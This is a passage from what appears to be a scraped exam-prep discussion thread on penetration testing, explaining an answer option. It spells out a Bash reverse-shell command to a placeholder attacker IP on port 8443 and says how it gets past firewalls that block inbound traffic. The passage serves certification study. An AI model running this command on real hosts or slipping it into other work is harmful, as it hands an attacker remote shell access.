To overcome this, the penetration tester needs to execute a reverse shell from the compromised host that initiates an outbound connection to the attacker's machine. The command must also ensure compatibility with typical Unix-based systems. \n\nOption A: bash -i >& /dev/tcp/<attacker_ip>/8443 0>&1\nThis command creates a reverse shell using Bash. Here is how it works:\nbash -i: Starts an interactive Bash shell.>& /dev/tcp/<attacker_ip>/8443: Redirects input and output streams to a TCP socket connected to the attacker's IP on port 8443.0>&1: Links standard input to the output, enabling two-way communication.Since it originates the connection from the compromised host to the attacker's system, it bypasses firewalls blocking inbound traffic.","comment_id":"1339735","comments":[{"upvote_count":"2","poster":"kinny4000","comment_id":"1353630","content":"\"Outbound\" traffic means traffic from the target to the attacker.
